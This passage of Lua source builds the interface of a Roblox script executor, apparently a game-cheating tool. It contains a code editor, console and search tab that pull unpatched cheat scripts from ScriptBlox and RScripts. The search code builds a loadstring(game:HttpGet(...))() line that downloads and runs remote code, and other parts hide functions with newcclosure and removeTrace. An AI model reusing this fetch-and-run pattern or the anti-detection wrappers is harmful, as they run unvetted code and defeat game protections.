							Size = UDim2.new(1, 0, 0, 12)
						}, {
							create("UICorner", { 
								CornerRadius = UDim.new(1, 0), 
								Name = "corner"
							}),
							create("UIStroke", { 
								ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
								Color = Color3.fromHex("141414"), 
								Name = "stroke", 
								Thickness = 1.2
							}),
							create("Frame", { 
								BackgroundColor3 = Color3.fromHex("303030"), 
								Name = "indicator", 
								Size = UDim2.new(59 / 998, 0, 1, 0)
							}, {
								create("UICorner", { 
									CornerRadius = UDim.new(1, 0), 
									Name = "corner"
								}),
								create("UIStroke", { 
									ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
									Color = Color3.fromHex("141414"), 
									Name = "stroke", 
									Thickness = 1.2
								})
							})
						})
					})
				}),
				create("ScrollingFrame", { 
					AnchorPoint = Vector2.new(1, 0.5), 
					BackgroundTransparency = 1, 
					BorderSizePixel = 0, 
					CanvasSize = UDim2.new(), 
					Name = "right", 
					Position = UDim2.new(1, -8, 0.5, 0), 
					ScrollBarThickness = 0, 
					Size = UDim2.new(0.5, -12, 1, -16)
				}, {
					create("UIListLayout", { 
						Name = "list", 
						Padding = UDim.new(0, 8), 
						SortOrder = Enum.SortOrder.LayoutOrder
					}),
					create("Frame", { 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						Name = "scriptApi", 
						Size = UDim2.new(1, 0, 0, 28)
					}, {
						create("TextButton", { 
							AnchorPoint = Vector2.new(0, 0.5), 
							AutoButtonColor = false, 
							BackgroundColor3 = Color3.fromHex("181818"), 
							BorderColor3 = Color3.fromHex("1b2a35"), 
							FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size14, 
							Name = "indicator", 
							Position = UDim2.new(0, 0, 0.5, 0), 
							Size = UDim2.new(0, 28, 0, 28), 
							Text = "", 
							TextColor3 = Color3.fromHex("000000"), 
							TextSize = 14
						}, {
							create("UICorner", { 
								CornerRadius = UDim.new(0, 4), 
								Name = "corner"
							}),
							create("ImageLabel", { 
								AnchorPoint = Vector2.new(0.5, 0.5), 
								BackgroundColor3 = Color3.fromHex("ffffff"), 
								BackgroundTransparency = 1, 
								Image = "rbxassetid://12874034639", 
								Name = "icon", 
								Position = UDim2.new(0.5, 0, 0.5, 0), 
								Size = UDim2.new(1, -8, 1, -8)
							}),
							create("UIStroke", { 
								ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
								Color = Color3.fromHex("141414"), 
								Name = "stroke", 
								Thickness = 1.2
							})
						}),
						create("TextButton", { 
							AnchorPoint = Vector2.new(1, 0.5), 
							AutoButtonColor = false, 
							BackgroundColor3 = Color3.fromHex("181818"), 
							FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size11, 
							Name = "title", 
							Position = UDim2.new(1, 0, 0.5, 0), 
							Size = UDim2.new(1, -36, 1, 0), 
							Text = uiSettings.searchAPI, 
							TextColor3 = Color3.fromHex("ebebeb"), 
							TextSize = 11
						}, {
							create("UICorner", { 
								CornerRadius = UDim.new(0, 4), 
								Name = "corner"
							}),
							create("UIStroke", { 
								ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
								Color = Color3.fromHex("141414"), 
								Name = "stroke", 
								Thickness = 1.2
							})
						}),
						create("Frame", { 
							AnchorPoint = Vector2.new(1, 0), 
							BackgroundColor3 = Color3.fromHex("181818"), 
							Name = "drop", 
							Position = UDim2.new(1, 0, 1, 8), 
							Size = UDim2.new(1, -36, 0, 84), 
							Visible = false, 
							ZIndex = 2
						}, {
							create("UIStroke", { 
								ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
								Color = Color3.fromHex("141414"), 
								Name = "stroke", 
								Thickness = 1.2
							}),
							create("UICorner", { 
								CornerRadius = UDim.new(0, 4), 
								Name = "corner"
							}),
							create("ScrollingFrame", { 
								Active = true, 
								AnchorPoint = Vector2.new(0.5, 0.5), 
								BackgroundColor3 = Color3.fromHex("ffffff"), 
								BackgroundTransparency = 1, 
								BorderSizePixel = 0, 
								BottomImage = "rbxassetid://12651249430", 
								CanvasSize = UDim2.new(0, 0, 0, 0), 
								MidImage = "rbxassetid://12651249103", 
								Name = "container", 
								Position = UDim2.new(0.5, 0, 0.5, 0), 
								ScrollBarImageColor3 = Color3.fromHex("141414"), 
								ScrollBarThickness = 4, 
								Size = UDim2.new(1, -16, 1, -16), 
								TopImage = "rbxassetid://12651248921", 
								ZIndex = 2
							}, {
								create("UIListLayout", { 
									Name = "list", 
									Padding = UDim.new(0, 6), 
									SortOrder = Enum.SortOrder.LayoutOrder
								}),
								create("UIPadding", { 
									Name = "padding", 
									PaddingBottom = UDim.new(0, 1), 
									PaddingLeft = UDim.new(0, 1), 
									PaddingRight = UDim.new(0, 1), 
									PaddingTop = UDim.new(0, 1)
								})
							})
						})
					}),
					create("Frame", { 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						BorderSizePixel = 0, 
						Name = "separator", 
						Size = UDim2.new(1, 0, 0, 13)
					}, {
						create("Frame", { 
							AnchorPoint = Vector2.new(0.5, 0.5), 
							BackgroundColor3 = Color3.fromHex("ffffff"), 
							BorderSizePixel = 0, 
							Name = "bar", 
							Position = UDim2.new(0.5, 0, 0.5, 0), 
							Size = UDim2.new(1, 0, 0, 1)
						}, {
							create("UIGradient", { 
								Color = ColorSequence.new({ 
									ColorSequenceKeypoint.new(0, Color3.fromHex("3c3c3c")), 
									ColorSequenceKeypoint.new(1, Color3.fromHex("3c3c3c"))
								}), 
								Transparency = NumberSequence.new({ 
									NumberSequenceKeypoint.new(0, 1), 
									NumberSequenceKeypoint.new(0.2, 0), 
									NumberSequenceKeypoint.new(0.8, 0), 
									NumberSequenceKeypoint.new(1, 1)
								})
							})
						})
					}),
					create("TextButton", { 
						AutoButtonColor = false, 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
						FontSize = Enum.FontSize.Size14, 
						Name = "antiAfk", 
						Size = UDim2.new(1, 0, 0, 28), 
						Text = "", 
						TextColor3 = Color3.fromHex("000000"), 
						TextSize = 14
					}, {
						create("Frame", { 
							AnchorPoint = Vector2.new(0, 0.5), 
							BackgroundColor3 = Color3.fromHex("181818"), 
							Name = "indicator", 
							Position = UDim2.new(0, 0, 0.5, 0), 
							Size = UDim2.new(0, 28, 0, 28)
						}, {
							create("UICorner", { 
								CornerRadius = UDim.new(0, 4), 
								Name = "corner"
							}),
							create("UIStroke", { 
								ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
								Color = Color3.fromHex("141414"), 
								Name = "stroke", 
								Thickness = 1.2
							}),
							create("ImageLabel", { 
								AnchorPoint = Vector2.new(0.5, 0.5), 
								BackgroundColor3 = Color3.fromHex("ffffff"), 
								BackgroundTransparency = 1, 
								Image = "rbxassetid://13107126808", 
								ImageTransparency = uiSettings.antiAfk and 0 or 1, 
								Name = "icon", 
								Position = UDim2.new(0.5, 0, 0.5, 0), 
								Size = UDim2.new(1, -8, 1, -8)
							})
						}),
						create("TextLabel", { 
							LanguageItem = {
								property = "Text",
								identifier = "AntiAFK"
							},
							AnchorPoint = Vector2.new(1, 0.5), 
							BackgroundColor3 = Color3.fromHex("ffffff"), 
							BackgroundTransparency = 1, 
							FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size11, 
							Name = "title", 
							Position = UDim2.new(1, 0, 0.5, 0), 
							Size = UDim2.new(1, -40, 1, 0), 
							TextColor3 = Color3.fromHex("ebebeb"), 
							TextSize = 11, 
							TextXAlignment = Enum.TextXAlignment.Left
						})
					}),
					create("Frame", { 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						BorderSizePixel = 0, 
						Name = "separator", 
						Size = UDim2.new(1, 0, 0, 11)
					}, {
						create("Frame", { 
							AnchorPoint = Vector2.new(0.5, 0.5), 
							BackgroundColor3 = Color3.fromHex("ffffff"), 
							BorderSizePixel = 0, 
							Name = "bar", 
							Position = UDim2.new(0.5, 0, 0.5, 0), 
							Size = UDim2.new(1, 0, 0, 1)
						}, {
							create("UIGradient", { 
								Color = ColorSequence.new({ 
									ColorSequenceKeypoint.new(0, Color3.fromHex("3c3c3c")), 
									ColorSequenceKeypoint.new(1, Color3.fromHex("3c3c3c"))
								}), 
								Transparency = NumberSequence.new({ 
									NumberSequenceKeypoint.new(0, 1), 
									NumberSequenceKeypoint.new(0.2, 0), 
									NumberSequenceKeypoint.new(0.8, 0), 
									NumberSequenceKeypoint.new(1, 1)
								})
							})
						})
					}),
					create("Frame", { 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						Name = "serverHopMode", 
						Size = UDim2.new(1, 0, 0, 28)
					}, {
						create("UIListLayout", { 
							FillDirection = Enum.FillDirection.Horizontal, 
							Name = "list", 
							Padding = UDim.new(0, 8), 
							SortOrder = Enum.SortOrder.LayoutOrder
						}),
						create("TextButton", { 
							LanguageItem = {
								property = "Text",
								identifier = "Full"
							},
							AnchorPoint = Vector2.new(1, 0.5), 
							AutoButtonColor = false, 
							BackgroundColor3 = Color3.fromHex(uiSettings.serverHopMode == "full" and "303030" or "181818"), 
							FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size11, 
							Name = "full", 
							Position = UDim2.new(1, 0, 0.5, 0), 
							Size = UDim2.new(0, 35, 1, 0), 
							TextColor3 = Color3.fromHex("ebebeb"), 
							TextSize = 11
						}, {
							create("UICorner", { 
								CornerRadius = UDim.new(0, 4), 
								Name = "corner"
							}),
							create("UIStroke", { 
								ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
								Color = Color3.fromHex("141414"), 
								Name = "stroke", 
								Thickness = 0.8
							})
						}),
						create("TextButton", { 
							LanguageItem = {
								property = "Text",
								identifier = "Empty"
							},
							AnchorPoint = Vector2.new(1, 0.5), 
							AutoButtonColor = false, 
							BackgroundColor3 = Color3.fromHex(uiSettings.serverHopMode == "empty" and "303030" or "181818"), 
							FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size11, 
							Name = "empty", 
							Position = UDim2.new(1, 0, 0.5, 0), 
							Size = UDim2.new(0, 49, 1, 0), 
							TextColor3 = Color3.fromHex("ebebeb"), 
							TextSize = 11
						}, {
							create("UICorner", { 
								CornerRadius = UDim.new(0, 4), 
								Name = "corner"
							}),
							create("UIStroke", { 
								ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
								Color = Color3.fromHex("141414"), 
								Name = "stroke", 
								Thickness = 0.8
							})
						}),
						create("TextButton", { 
							LanguageItem = {
								property = "Text",
								identifier = "BestPing"
							},
							AnchorPoint = Vector2.new(1, 0.5), 
							AutoButtonColor = false, 
							BackgroundColor3 = Color3.fromHex(uiSettings.serverHopMode == "bestPing" and "303030" or "181818"), 
							FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size11, 
							Name = "bestPing", 
							Position = UDim2.new(1, 0, 0.5, 0), 
							Size = UDim2.new(0, 65, 1, 0), 
							TextColor3 = Color3.fromHex("ebebeb"), 
							TextSize = 11
						}, {
							create("UICorner", { 
								CornerRadius = UDim.new(0, 4), 
								Name = "corner"
							}),
							create("UIStroke", { 
								ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
								Color = Color3.fromHex("141414"), 
								Name = "stroke", 
								Thickness = 0.8
							})
						}),
						create("TextButton", { 
							LanguageItem = {
								property = "Text",
								identifier = "Random"
							},
							AnchorPoint = Vector2.new(1, 0.5), 
							AutoButtonColor = false, 
							BackgroundColor3 = Color3.fromHex(uiSettings.serverHopMode == "random" and "303030" or "181818"), 
							FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size11, 
							Name = "random", 
							Position = UDim2.new(1, 0, 0.5, 0), 
							Size = UDim2.new(0, 59, 1, 0), 
							TextColor3 = Color3.fromHex("ebebeb"), 
							TextSize = 11
						}, {
							create("UICorner", { 
								CornerRadius = UDim.new(0, 4), 
								Name = "corner"
							}),
							create("UIStroke", { 
								ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
								Color = Color3.fromHex("141414"), 
								Name = "stroke", 
								Thickness = 0.8
							})
						})
					}),
					create("UIPadding", { 
						Name = "padding", 
						PaddingBottom = UDim.new(0, 1), 
						PaddingLeft = UDim.new(0, 1), 
						PaddingRight = UDim.new(0, 1), 
						PaddingTop = UDim.new(0, 1)
					}),
					create("Frame", { 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						Name = "serverHop", 
						Size = UDim2.new(1, 0, 0, 28)
					}, {
						create("TextButton", { 
							LanguageItem = {
								property = "Text",
								identifier = "RejoinServer"
							},
							AnchorPoint = Vector2.new(1, 0.5), 
							AutoButtonColor = false, 
							BackgroundColor3 = Color3.fromHex("181818"), 
							FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size11, 
							Name = "rejoin", 
							Position = UDim2.new(1, 0, 0.5, 0), 
							Size = UDim2.new(0.5, -4, 1, 0), 
							TextColor3 = Color3.fromHex("ebebeb"), 
							TextSize = 11
						}, {
							create("UICorner", { 
								CornerRadius = UDim.new(0, 4), 
								Name = "corner"
							}),
							create("UIStroke", { 
								ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
								Color = Color3.fromHex("141414"), 
								Name = "stroke", 
								Thickness = 0.8
							})
						}),
						create("TextButton", { 
							LanguageItem = {
								property = "Text",
								identifier = "ServerHop"
							},
							AnchorPoint = Vector2.new(0, 0.5), 
							AutoButtonColor = false, 
							BackgroundColor3 = Color3.fromHex("181818"), 
							FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
							FontSize = Enum.FontSize.Size11, 
							Name = "hop", 
							Position = UDim2.new(0, 0, 0.5, 0), 
							Size = UDim2.new(0.5, -4, 1, 0), 
							TextColor3 = Color3.fromHex("ebebeb"), 
							TextSize = 11
						}, {
							create("UICorner", { 
								CornerRadius = UDim.new(0, 4), 
								Name = "corner"
							}),
							create("UIStroke", { 
								ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
								Color = Color3.fromHex("141414"), 
								Name = "stroke", 
								Thickness = 0.8
							})
						})
					})
				})
			})
		}),
		create("UISizeConstraint", { 
			MaxSize = Vector2.new(800, 500), 
			Name = "constraint"
		}),
		create("ImageLabel", { 
			AnchorPoint = Vector2.new(0.5, 0.5), 
			BackgroundColor3 = Color3.fromHex("ffffff"), 
			BackgroundTransparency = 1, 
			Image = "rbxassetid://12874061329", 
			ImageColor3 = Color3.fromHex("000000"), 
			Name = "blur", 
			Position = UDim2.new(0.5, 0, 0.5, 0), 
			ScaleType = Enum.ScaleType.Slice, 
			Size = UDim2.new(1, 10, 1, 10), 
			SliceCenter = Rect.new(10, 10, 118, 118), 
			ZIndex = 0
		}),
		create("UIStroke", { 
			ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
			Color = Color3.fromHex("141414"), 
			Name = "stroke", 
			Thickness = 0.8
		})
	});

	--[[ Start ]]--

	local runCode = removeTrace("runcode");

	local tabs = main.tabs;
	local tabButtons = main.left.buttons;

	--[[ Toggle UI ]]--

	do
		local isOpen = false;

		toggleMain.MouseButton1Click:Connect(function()
			isOpen = not isOpen;
			main.Visible = isOpen;
		end);
	end

	--[[ Toggle Drag ]]--

	do
		local currentCamera = workspace.CurrentCamera;

		toggleMain.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				local inputConn = userInputService.InputChanged:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
						tween(toggleMain, 0.18, {
							Position = UDim2.new(0, math.clamp(input.Position.X, 25, currentCamera.ViewportSize.X - 25), 0, math.clamp(input.Position.Y, 25, currentCamera.ViewportSize.Y - 25))
						});
					end
				end);
				local conn; conn = input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						inputConn:Disconnect();
						conn:Disconnect();
					end
				end);
			end
		end);
	end

	--[[ Select Tabs ]]--

	local selectedTab = tabs.editor;

	local function selectTab(name)
		local btn, tab = tabButtons[name], tabs[name];
		if selectedTab ~= tab then
			selectedTab.Visible = false;
			tween(tabButtons[selectedTab.Name], 0.18, {
				BackgroundTransparency = 1;
			});
			selectedTab = tab;
			tab.Visible = true;
			tween(btn, 0.18, {
				BackgroundTransparency = 0;
			});
		end
	end

	do
		local buttonList = tabButtons:GetChildren();
		for i = 1, #buttonList do
			local v = buttonList[i];
			if v:IsA("TextButton") then
				local tab = tabs[v.Name];
				v.MouseButton1Click:Connect(function()
					selectTab(v.Name);
				end);
			end
		end
	end

	--[[ Editor ]]--

	do
		local editor = tabs.editor;

		local scroll = editor.main.container;
		local content = scroll.content;

		do
			local lineNumbers = editor.main.lineNumbers;
			local lineLabel = lineNumbers.label;

			local function getTextBounds(input)
				return textService:GetTextSize(input, content.TextSize, content.Font, hugeVector2);
			end

			content:GetPropertyChangedSignal("Text"):Connect(function()
				local input = content.Text;
				local lines = math.min(#string.split(input, "\n"), maxLines);
				local digitLength = #tostring(lines) * 6;
				local textBounds = getTextBounds(input);
				local textHeight = math.min(textBounds.Y, maxLines * 11);
				local str = "";
				for i = 1, lines do
					str ..= string.format("%d%s", i, i == lines and "" or "\n");
				end
				lineLabel.Text = str;
				lineNumbers.Size = UDim2.new(0, digitLength, 1, 0);
				lineNumbers.CanvasSize = UDim2.new(0, digitLength, 0, textHeight);
				scroll.Size = UDim2.new(1, -(9 + digitLength), 1, 0);
				scroll.CanvasSize = UDim2.new(0, textBounds.X + digitLength, 0, textHeight);
			end);

			scroll:GetPropertyChangedSignal("CanvasPosition"):Connect(function()
				lineNumbers.CanvasPosition = Vector2.new(0, scroll.CanvasPosition.Y);
			end);
		end		

		do
			local right = editor.right.buttons;
			local items = right:GetChildren();
			for i = 1, #items do
				local v = items[i];
				if v:IsA("TextButton") then
					addTransparencyHighlights(v);
				end
			end

			right.executeBox.MouseButton1Click:Connect(function()
				runCode(content.Text);
			end);

			right.clearBox.MouseButton1Click:Connect(function()
				content.Text = "";
			end);

			right.executeClip.MouseButton1Click:Connect(function()
				runCode(_getclipboard());
			end);

			right.copyClip.MouseButton1Click:Connect(function()
				_setclipboard(content.Text);
			end);

			right.loadClip.MouseButton1Click:Connect(function()
				local text = _getclipboard();
				if #text > 16384 then
					rconsolewarn("Clipboard Text is too large to be loaded to the editor. Execute directly using \"Execute Clipboard\".");
				else
					content.Text = text;
				end
			end);

			resizeFunctions[#resizeFunctions + 1] = function()
				local maxBound = 0;
				for i = 1, #items do
					local v = items[i];
					if v:IsA("TextButton") then
						local bound = v.title.TextBounds.X;
						if bound > maxBound then
							maxBound = bound;
						end
					end
				end
				editor.right.Size = UDim2.new(0, maxBound + 48, 1, 0);
				editor.main.Size = UDim2.new(1, -(maxBound + 56), 1, 0);
			end
		end
	end

	--[[ Games ]]--

	do
		local games = tabs.games;

		local scroll = games.container;
		local layout = scroll.grid;

		layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
			scroll.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 4);
		end);

		do
			local search = games.search;
			local searchInput = games.searchInput;

			local template = create("Frame", { 
				BackgroundColor3 = Color3.fromHex("181818"), 
				Name = "template",
				Size = UDim2.new(0, 100, 0, 100)
			}, {
				create("UICorner", { 
					CornerRadius = UDim.new(0, 4), 
					Name = "corner"
				}),
				create("UIStroke", { 
					ApplyStrokeMode = Enum.ApplyStrokeMode.Border, 
					Color = Color3.fromHex("141414"), 
					Name = "stroke", 
					Thickness = 1.2
				}),
				create("ImageLabel", { 
					AnchorPoint = Vector2.new(0.5, 0), 
					BackgroundColor3 = Color3.fromHex("ffffff"), 
					BackgroundTransparency = 1, 
					Image = "", 
					Name = "icon", 
					Position = UDim2.new(0.5, 0, 0, 0), 
					Size = UDim2.new(1, 0, 1, -30)
				}, {
					create("UICorner", { 
						CornerRadius = UDim.new(0, 5), 
						Name = "corner"
					})
				}),
				create("TextLabel", { 
					AnchorPoint = Vector2.new(0.5, 0), 
					BackgroundColor3 = Color3.fromHex("ffffff"), 
					BackgroundTransparency = 1, 
					FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal), 
					FontSize = Enum.FontSize.Size12, 
					Name = "title", 
					Position = UDim2.new(0.5, 0, 0, 0), 
					Size = UDim2.new(1, -16, 0, 24), 
					Text = "", 
					TextColor3 = Color3.fromHex("ebebeb"), 
					TextSize = 12, 
					TextStrokeColor3 = Color3.fromHex("0c0c0c"), 
					TextStrokeTransparency = 0.25, 
					TextTruncate = Enum.TextTruncate.AtEnd, 
					TextXAlignment = Enum.TextXAlignment.Right
				}),
				create("TextButton", { 
					AnchorPoint = Vector2.new(0.5, 1), 
					AutoButtonColor = false, 
					BackgroundColor3 = Color3.fromHex("303030"), 
					BackgroundTransparency = 1, 
					FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
					FontSize = Enum.FontSize.Size14, 
					Name = "execute", 
					Position = UDim2.new(0.5, 0, 1, -4), 
					Size = UDim2.new(1, -8, 0, 22), 
					Text = "", 
					TextColor3 = Color3.fromHex("000000"), 
					TextSize = 14
				}, {
					create("ImageLabel", { 
						AnchorPoint = Vector2.new(1, 0.5), 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						Image = "rbxassetid://12778482262", 
						Name = "icon", 
						Position = UDim2.new(1, -2, 0.5, 0), 
						Size = UDim2.new(0, 16, 0, 16)
					}),
					create("UICorner", { 
						CornerRadius = UDim.new(0, 4), 
						Name = "corner"
					}),
					create("TextLabel", { 
						LanguageItem = {
							property = "Text",
							identifier = "Execute"
						},
						AnchorPoint = Vector2.new(0, 0.5), 
						BackgroundColor3 = Color3.fromHex("ffffff"), 
						BackgroundTransparency = 1, 
						FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal), 
						FontSize = Enum.FontSize.Size12, 
						Name = "title", 
						Position = UDim2.new(0, 2, 0.5, 0), 
						Size = UDim2.new(1, -30, 1, 0), 
						TextColor3 = Color3.fromHex("ebebeb"), 
						TextSize = 12, 
						TextXAlignment = Enum.TextXAlignment.Left
					})
				})
			});

			local validExtensions = { "png", "jpg", "jpeg" };

			local function sendRequest(query, method, headers, body)
				local succ, res = pcall(_request, {
					Url = query,
					Method = method,
					Headers = headers,
					Body = body
				});
				if succ == false or res.Success == false then
					return;
				end
				return res.Body;
			end

			local function setIcon(icon, path)
				local fileName = urlEncode(httpService, path);
				local ext = select(-1, unpack(string.split(fileName, "%2E")));
				local res = sendRequest(path, "GET");
				if res and icon.Parent.Parent == scroll then
					local filePath = string.format("evonui/search/%s.%s", fileName, ext);
					_writefile(filePath, res);
					icon.Image = _getcustomasset(filePath);
				end
			end

			local function addScript(title, icon, source)
				local item = template:Clone();
				item.title.Text = title;
				item.Parent = scroll;

				task.defer(setIcon, item.icon, icon);
				addTransparencyHighlights(item.execute);

				item.execute.MouseButton1Click:Connect(function()
					runCode(source);
				end);
			end

			local function calculateCellSize()
				local absoluteSize = scroll.AbsoluteSize;
				local sizeX = absoluteSize.X * 0.25 - 6;
				local sizeY = 0;
				for i = 5, 1, -1 do
					local potentialValue = (absoluteSize.Y - (2 + 6 * (i - 1))) / i;
					if sizeX and potentialValue > sizeX then
						break;
					end
					sizeY = potentialValue;
				end
				layout.CellSize = UDim2.new(0.25, -6, 0, sizeY);
			end

			local isSearching = false;

			local searchFunctions = {
				ScriptBlox = function(query)
					local res = sendRequest(string.format("https://scriptblox.com/api/script/search?q=%s&max=20&mode=free", query), "GET");
					if res then
						local scripts = jsonDecode(httpService, res).result.scripts;
						for i = 1, #scripts do
							local scriptResult = scripts[i];
							if scriptResult.isPatched == false then
								if string.sub(scriptResult.game.imageUrl, -4) == "webp" then
									scriptResult.game.imageUrl = string.format("https://assetgame.roblox.com/Game/Tools/ThumbnailAsset.ashx?aid=%d&fmt=png&wd=1920&ht=1080", scriptResult.isUniversal and 4483381587 or scriptResult.game.gameId);
								elseif string.sub(scriptResult.game.imageUrl, 1, 1) == "/" then
									scriptResult.game.imageUrl = "https://scriptblox.com" .. scriptResult.game.imageUrl;
								end
								addScript(scriptResult.title, scriptResult.game.imageUrl, scriptResult.script);
							end
						end
					end
				end,
				RScripts = function(query)
					if rScriptsApiKey == "0" then
						warn("RScripts API Key Not Supplied");
						return;
					end
				
					local res = sendRequest(string.format("https://api.rscripts.net/search/basic/%s/views/desc/1/%s", query, rScriptsApiKey), "GET");
					if res then
						local scripts = jsonDecode(httpService, res).scripts;
						if scripts then
							for i = 1, #scripts do
								local v = scripts[i];
								if v.download then
									addScript(v.title, v.image, string.format("loadstring(game:HttpGet(\"%s\", true))();", v.download));
								end
							end
						end -- else they got no scripts lol
					end
				end
			};

			search.MouseButton1Click:Connect(function()
				if isSearching == false then
					isSearching = true;
					local children = scroll:GetChildren();
					for i = 1, #children do
						local v = children[i];
						if v:IsA("Frame") then
							v:Destroy();
						end
					end
					if _isfolder("evonui/search") == false then
						_makefolder("evonui/search");
					end
					local files = _listfiles("evonui/search");
					for i = 1, #files do
						_delfile(files[i]);
					end
					calculateCellSize();
					searchFunctions[uiSettings.searchAPI](urlEncode(httpService, searchInput.Text));
					isSearching = false;
				end
			end);

			resizeFunctions[#resizeFunctions + 1] = function()
				search.Size = UDim2.new(0, search.TextBounds.X + 30, 0, 30);
				searchInput.Size = UDim2.new(1, -(search.TextBounds.X + 54), 0, 30);
			end
		end
	end

	--[[ Console ]]--

	do
		local console = tabs.console;

		local scroll = console.main.container;
		local content = scroll.content;

		do
			local function getTextBounds(input)
				return textService:GetTextSize(input, content.TextSize, content.Font, hugeVector2);
			end

			content:GetPropertyChangedSignal("Text"):Connect(function()
				local input = content.Text;
				local textBounds = getTextBounds(input);
				scroll.CanvasSize = UDim2.new(0, textBounds.X, 0, math.min(textBounds.Y, maxLines * 11));
			end);
		end

		do
			local bottom = console.bottom;
			local items = bottom:GetChildren();
			for i = 1, #items do
				local v = items[i];
				if v:IsA("TextButton") then
					addTransparencyHighlights(v);
				end
			end

			local clearConsole = bottom.clearConsole;
			local copyConsole = bottom.copyConsole;

			clearConsole.MouseButton1Click:Connect(function()
				content.Text = "";
			end);

			copyConsole.MouseButton1Click:Connect(function()
				_setclipboard(content.Text);
			end);

			resizeFunctions[#resizeFunctions + 1] = function()
				clearConsole.Size = UDim2.new(0, clearConsole.title.TextBounds.X + 36, 0, 22);
				copyConsole.Size = UDim2.new(0, copyConsole.title.TextBounds.X + 36, 0, 22);
			end
		end

		do
			local typeToInfo = {
				MessageOutput = {
					colour = "#45cc57",
					prefix = "Output"
				},
				MessageInfo = {
					colour = "#2f6cd6",
					prefix = "Info"
				},
				MessageWarning = {
					colour = "#d49d37",
					prefix = "Warning"
				},
				MessageError = {
					colour = "#d44437",
					prefix = "Error"
				}
			};

			local function appendConsole(msg, msgType)
				local info = typeToInfo[msgType.Name];
				if info == nil then
					return;
				end
				content.Text ..= (content.Text == "" and "​ ​ " or "\n") .. string.format("<font color=\"%s\">[%d:%s]</font> %s", info.colour, os.time(), info.prefix, msg);
			end

			game:GetService("LogService").MessageOut:Connect(appendConsole);

			do
				local lprint, linfo, lwarn, lerror = removeTrace("logprint"), removeTrace("loginfo"), removeTrace("logwarn"), removeTrace("logerror");

				env.rconsoleprint = _newcclosure(function(msg)
					appendConsole(msg, Enum.MessageType.MessageOutput);
					lprint(msg);
				end);

				env.rconsoleinfo = _newcclosure(function(msg)
					appendConsole(msg, Enum.MessageType.MessageInfo);
					linfo(msg);
				end);

				env.rconsolewarn = _newcclosure(function(msg)
					appendConsole(msg, Enum.MessageType.MessageWarning);
					lwarn(msg);
				end);

				env.rconsoleerror = _newcclosure(function(msg)
					appendConsole(msg, Enum.MessageType.MessageError);
					lerror(msg);
				end);

				env.rconsoleclear = _newcclosure(function()
					content.Text = "";
				end);

				env.rconsoleshow = _newcclosure(function()
					if selectedTab ~= console then
						selectTab("console");
					end
				end);

				env.rconsolehide = _newcclosure(function()
					if selectedTab == console then
						selectTab("editor");
					end
				end);

				env.rconsoletoggle = _newcclosure(function()
					selectTab(selectedTab == console and "editor" or "console");
				end);

				env.rconsolehidden = _newcclosure(function()
					return selectedTab ~= console;
				end);
			end
		end
	end

	--[[ Settings ]]--

	do
		local _settings = tabs.settings;

		do
			local template = create("TextButton", { 
				AutoButtonColor = false,
				BackgroundColor3 = Color3.fromHex("ffffff"), 
				BackgroundTransparency = 1, 
				Text = "",
				Name = "languageExample", 
				Size = UDim2.new(1, 0, 0, 30), 
				ZIndex = 2
			}, {
				create("Frame", { 
